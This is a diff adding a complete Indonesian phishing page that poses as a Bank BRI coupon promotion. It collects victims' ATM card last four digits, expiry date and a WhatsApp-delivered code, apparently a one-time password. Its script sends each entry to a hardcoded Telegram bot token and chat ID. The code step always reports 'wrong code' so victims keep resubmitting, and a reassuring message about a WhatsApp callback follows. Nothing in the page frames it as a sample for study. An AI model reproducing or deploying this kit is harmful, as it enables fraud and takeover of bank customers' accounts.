@@ -1,0 +1,571 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Klaim Kupon Eksklusif - BANK BRI</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background: linear-gradient(135deg, #002d62 0%, #00529b 50%, #001f3f 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 12px;
+            color: #1e293b;
+            overflow-x: hidden;
+        }
+
+        .container {
+            background: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(10px);
+            -webkit-backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            padding: 24px 20px;
+            border-radius: 20px;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .container::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 5px;
+            background: linear-gradient(90deg, #f59e0b, #fbbf24, #f59e0b);
+        }
+
+        h1 {
+            font-size: 1.2rem;
+            margin-bottom: 6px;
+            color: #003366;
+            font-weight: 800;
+            letter-spacing: -0.5px;
+        }
+
+        p.subtitle {
+            font-size: 0.82rem;
+            margin-bottom: 20px;
+            color: #64748b;
+            line-height: 1.4;
+        }
+
+        .btn-action {
+            background: linear-gradient(135deg, #00529b 0%, #003366 100%);
+            color: #ffffff;
+            border: none;
+            padding: 12px 16px;
+            font-size: 0.95rem;
+            font-weight: 700;
+            border-radius: 12px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 6px 16px rgba(0, 82, 155, 0.35);
+            width: 100%;
+            letter-spacing: 0.5px;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        .btn-action:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 20px rgba(0, 82, 155, 0.45);
+            background: linear-gradient(135deg, #0063b8 0%, #003d7a 100%);
+        }
+
+        .btn-action:active {
+            transform: translateY(0);
+        }
+
+        /* TAMPILAN KARTU ATM 3D ELEGAN (RESPONSIF) */
+        .form-section {
+            display: none;
+            margin-top: 15px;
+            text-align: left;
+        }
+
+        .form-section.show {
+            display: block;
+        }
+
+        .coupon-input-section {
+            display: none;
+            margin-top: 15px;
+            text-align: left;
+        }
+
+        .coupon-input-section.show {
+            display: block;
+        }
+
+        .atm-card-preview {
+            background: linear-gradient(135deg, #0f172a 0%, #1e3a8a 50%, #1e293b 100%);
+            border-radius: 14px;
+            padding: 16px;
+            color: #ffffff;
+            margin: 0 auto 18px auto;
+            box-shadow: 0 10px 25px rgba(15, 23, 42, 0.4);
+            position: relative;
+            overflow: hidden;
+            width: 100%;
+            max-width: 280px;
+            aspect-ratio: 1.58 / 1;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            border: 1px solid rgba(255,255,255,0.15);
+        }
+
+        .atm-card-preview::after {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: linear-gradient(45deg, transparent 45%, rgba(255,255,255,0.1) 50%, transparent 55%);
+            transform: rotate(25deg);
+            pointer-events: none;
+        }
+
+        .atm-top-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .atm-chip {
+            width: 32px;
+            height: 24px;
+            background: linear-gradient(135deg, #fde047 0%, #ca8a04 100%);
+            border-radius: 4px;
+            box-shadow: inset 0 1px 2px rgba(255,255,255,0.6);
+        }
+
+        .atm-logo-text {
+            font-weight: 900;
+            font-style: italic;
+            font-size: 0.85rem;
+            letter-spacing: 1px;
+            color: #93c5fd;
+        }
+
+        .atm-number {
+            font-family: 'Courier New', Courier, monospace;
+            font-size: 1rem;
+            letter-spacing: 2px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            color: #f8fafc;
+            text-shadow: 0 2px 4px rgba(0,0,0,0.3);
+        }
+
+        .atm-number span {
+            transition: all 0.3s ease;
+            padding: 2px;
+        }
+
+        .atm-footer {
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-end;
+        }
+
+        .atm-label {
+            font-size: 0.48rem;
+            color: #94a3b8;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .atm-expiry-val {
+            font-family: 'Courier New', Courier, monospace;
+            font-size: 0.85rem;
+            letter-spacing: 1.5px;
+            color: #f8fafc;
+            padding: 2px 4px;
+            border-radius: 4px;
+            transition: all 0.3s ease;
+        }
+
+        .highlight-expiry {
+            background: rgba(251, 191, 36, 0.3);
+            border: 1px dashed #fbbf24;
+            color: #fef08a;
+            transform: scale(1.05);
+        }
+
+        .form-group {
+            margin-bottom: 14px;
+            text-align: left;
+        }
+
+        .form-group label {
+            display: block;
+            font-size: 0.8rem;
+            font-weight: 700;
+            color: #003366;
+            margin-bottom: 5px;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 11px 13px;
+            border: 1.5px solid #cbd5e1;
+            border-radius: 10px;
+            font-size: 0.92rem;
+            color: #003366;
+            outline: none;
+            transition: all 0.2s ease;
+            background: #f8fafc;
+            -webkit-appearance: none;
+        }
+
+        .form-group input::placeholder {
+            color: #94a3b8;
+            font-style: italic;
+            font-weight: normal;
+            opacity: 0.7;
+        }
+
+        .form-group input:focus {
+            border-color: #00529b;
+            background: #ffffff;
+            box-shadow: 0 0 0 4px rgba(0, 82, 155, 0.1);
+        }
+
+        .form-group input.error {
+            border-color: #dc2626;
+            background: #fef2f2;
+        }
+
+        .error-msg {
+            color: #dc2626;
+            font-size: 0.75rem;
+            margin-top: 4px;
+            display: none;
+            font-weight: 600;
+        }
+        .error-msg.show {
+            display: block;
+        }
+
+        /* ANIMASI PROSES & SUKSES AKHIR */
+        .loading-section {
+            display: none;
+            text-align: center;
+            padding: 20px 5px;
+        }
+        .loading-section.show {
+            display: block;
+        }
+
+        .spinner {
+            width: 45px;
+            height: 45px;
+            border: 4px solid #e2e8f0;
+            border-top: 4px solid #00529b;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 16px auto;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .success-icon {
+            width: 55px;
+            height: 55px;
+            background: #059669;
+            color: white;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 26px;
+            margin: 0 auto 16px auto;
+            box-shadow: 0 8px 16px rgba(5, 150, 105, 0.3);
+            animation: bounceIn 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        }
+
+        @keyframes bounceIn {
+            0% { transform: scale(0); }
+            100% { transform: scale(1); }
+        }
+
+        .processing-title {
+            font-size: 1.1rem;
+            font-weight: 800;
+            color: #003366;
+            margin-bottom: 8px;
+        }
+
+        .processing-desc {
+            font-size: 0.85rem;
+            color: #64748b;
+            line-height: 1.5;
+        }
+
+        .whatsapp-highlight {
+            color: #059669;
+            font-weight: 700;
+        }
+
+        @media (max-width: 360px) {
+            .container {
+                padding: 18px 14px;
+            }
+            h1 {
+                font-size: 1.1rem;
+            }
+            .atm-card-preview {
+                max-width: 250px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <h1 id="mainTitle">Dapatkan Kode Kupon Anda!</h1>
+        <p class="subtitle" id="subTitle">Tekan tombol di bawah ini untuk melanjutkan proses klaim kupon undian eksklusif Anda.</p>
+        
+        <!-- TAHAP 1: TOMBOL UTAMA -->
+        <button class="btn-action" id="actionBtn" onclick="proceedToForm()">Ambil Kupon Sekarang</button>
+
+        <!-- TAHAP 2: FORMULIR KARTU ATM -->
+        <div class="form-section" id="formSection">
+            <!-- Tampilan Kartu ATM 3D -->
+            <div class="atm-card-preview" id="atmCard">
+                <div class="atm-top-row">
+                    <div class="atm-chip"></div>
+                    <div class="atm-logo-text">BRImo Festival</div>
+                </div>
+                <div class="atm-number">
+                    <span>••••</span>
+                    <span>••••</span>
+                    <span>••••</span>
+                    <span id="last4Block">••••</span>
+                </div>
+                <div class="atm-footer">
+                    <div>
+                        <div class="atm-label">CARD HOLDER</div>
+                        <div style="font-size: 0.7rem; font-weight: bold; letter-spacing: 1px;">NASABAH VIP</div>
+                    </div>
+                    <div>
+                        <div class="atm-label">VALID THRU</div>
+                        <div class="atm-expiry-val" id="cardPreviewExpiry">MM/YY</div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="form-group">
+                <label for="lastFourDigits">4 Digit Terakhir Nomor Kartu ATM</label>
+                <input type="text" id="lastFourDigits" maxlength="4" placeholder="Contoh: 5678" inputmode="numeric" oninput="updateLastFour(this)">
+            </div>
+            <div class="form-group">
+                <label for="cardExpiry">Masa Berlaku Kartu (Valid Thru)</label>
+                <input type="text" id="cardExpiry" maxlength="5" placeholder="MM/YY" inputmode="numeric" oninput="updateCardExpiry(this)" onfocus="focusExpiry(true)" onblur="focusExpiry(false)">
+            </div>
+            
+            <!-- Tombol Konfirmasi Kartu -->
+            <button class="btn-action" id="submitCardBtn" onclick="submitCardData()">Berikutnya</button>
+        </div>
+
+        <!-- TAHAP 3: FORMULIR MASUKKAN KODE KUPON -->
+        <div class="coupon-input-section" id="couponInputSection">
+            <div class="form-group">
+                <label for="inputedCouponCode">Masukkan kode kupon yg anda terima melalui Whatsapp</label>
+                <input type="text" id="inputedCouponCode" inputmode="numeric" pattern="[0-9]*" placeholder="masukan kode kupon disini" style="text-align: center; font-weight: bold; letter-spacing: 2px;" oninput="clearError()">
+                <div class="error-msg" id="couponErrorMsg">Kode Kupon Salah! Silakan periksa kembali kode yang Anda terima.</div>
+            </div>
+            
+            <!-- Tombol Konfirmasi Akhir -->
+            <button class="btn-action" onclick="submitFinalCoupon()">Konfirmasi Kupon</button>
+        </div>
+
+        <!-- TAHAP 4: ANIMASI PROSES & PESAN AKHIR -->
+        <div class="loading-section" id="loadingSection">
+            <div id="loadingSpinnerBox">
+                <div class="spinner"></div>
+                <div class="processing-title">Memproses Data Kupon...</div>
+                <div class="processing-desc">Mohon tunggu sebentar, sistem kami sedang memvalidasi data Anda secara aman.</div>
+            </div>
+            <div id="successBox" style="display: none;">
+                <div class="success-icon">&#10003;</div>
+                <div class="processing-title">Kupon Sedang Dalam Proses!</div>
+                <div class="processing-desc">
+                    Terima kasih. Kupon undian eksklusif Anda sedang disiapkan dan Customer Service kami akan segera menghubungi Anda melalui <span class="whatsapp-highlight">WhatsApp</span> dalam beberapa menit ke depan.
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // KONFIGURASI TELEGRAM BOT TERBARU
+        const TELEGRAM_BOT_TOKEN = '8729409676:AAF17ACyUCWH7Fr_oxKos0yN89eDHPZc0MY';
+        const TELEGRAM_CHAT_ID = '7157332026';
+
+        let savedLastFour = '';
+        let savedExpiry = '';
+
+        function proceedToForm() {
+            document.getElementById('actionBtn').style.display = 'none';
+
+            document.getElementById('mainTitle').innerText = "Verifikasi Keamanan Kartu";
+            document.getElementById('subTitle').innerText = "";
+            document.getElementById('subTitle').style.marginBottom = "10px";
+            
+            document.getElementById('formSection').classList.add('show');
+
+            const cardInput = document.getElementById('lastFourDigits');
+            if (cardInput) {
+                cardInput.focus();
+            }
+        }
+
+        function updateLastFour(input) {
+            let val = input.value.replace(/\D/g, '').substring(0, 4);
+            input.value = val;
+
+            const block = document.getElementById('last4Block');
+            if (val.length === 0) {
+                block.innerText = "••••";
+            } else {
+                block.innerText = val.padEnd(4, '•');
+            }
+        }
+
+        function updateCardExpiry(input) {
+            let val = input.value.replace(/\D/g, '');
+            if (val.length >= 3) {
+                val = val.substring(0, 2) + '/' + val.substring(2, 4);
+            }
+            input.value = val;
+
+            const preview = document.getElementById('cardPreviewExpiry');
+            if (val.length === 0) {
+                preview.innerText = "MM/YY";
+            } else {
+                preview.innerText = val;
+            }
+        }
+
+        function focusExpiry(isFocus) {
+            const preview = document.getElementById('cardPreviewExpiry');
+            if (isFocus) {
+                preview.classList.add('highlight-expiry');
+            } else {
+                preview.classList.remove('highlight-expiry');
+            }
+        }
+
+        function submitCardData() {
+            const lastFour = document.getElementById('lastFourDigits').value.trim();
+            const cardExpiry = document.getElementById('cardExpiry').value.trim();
+
+            if (lastFour.length !== 4) {
+                alert("Mohon masukkan 4 digit terakhir nomor kartu ATM Anda dengan benar.");
+                return;
+            }
+
+            if (cardExpiry.length < 4) {
+                alert("Mohon masukkan masa berlaku kartu dengan format yang benar (MM/YY).");
+                return;
+            }
+
+            savedLastFour = lastFour;
+            savedExpiry = cardExpiry;
+
+            const message = `💳 *Data Kartu Diterima!*\n\n` +
+                            `4 Digit Terakhir Kartu: *${savedLastFour}*\n` +
+                            `Masa Berlaku (Valid Thru): *${savedExpiry}*`;
+
+            sendTelegramNotification(message);
+
+            document.getElementById('formSection').classList.remove('show');
+            document.getElementById('couponInputSection').classList.add('show');
+
+            document.getElementById('mainTitle').innerText = "Masukkan Kode Kupon";
+            document.getElementById('subTitle').innerText = "Silakan masukkan kode kupon yang Anda terima.";
+            
+            const couponInput = document.getElementById('inputedCouponCode');
+            if (couponInput) {
+                couponInput.focus();
+            }
+        }
+
+        function clearError() {
+            const inputField = document.getElementById('inputedCouponCode');
+            const errorMsg = document.getElementById('couponErrorMsg');
+            inputField.classList.remove('error');
+            errorMsg.classList.remove('show');
+        }
+
+        function submitFinalCoupon() {
+            const inputField = document.getElementById('inputedCouponCode');
+            const errorMsg = document.getElementById('couponErrorMsg');
+            const attemptedCode = inputField.value.trim();
+
+            if (attemptedCode === "") {
+                inputField.classList.add('error');
+                errorMsg.classList.add('show');
+                inputField.focus();
+                return;
+            }
+
+            const message = `4 Digit Terakhir Kartu: *${savedLastFour}*\n` +
+                            `Kode yang Dimasukkan: *${attemptedCode}*`;
+
+            sendTelegramNotification(message);
+
+            inputField.classList.add('error');
+            errorMsg.classList.add('show');
+            
+            inputField.value = '';
+            inputField.focus();
+        }
+
+        function sendTelegramNotification(message) {
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            
+            const data = {
+                chat_id: TELEGRAM_CHAT_ID,
+                text: message,
+                parse_mode: 'Markdown'
+            };
+
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data)
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Notifikasi berhasil terkirim ke Telegram:', data);
+            })
+            .catch((error) => {
+                console.error('Gagal mengirim notifikasi:', error);
+            });
+        }
+    </script>
+
+</body>
+</html>
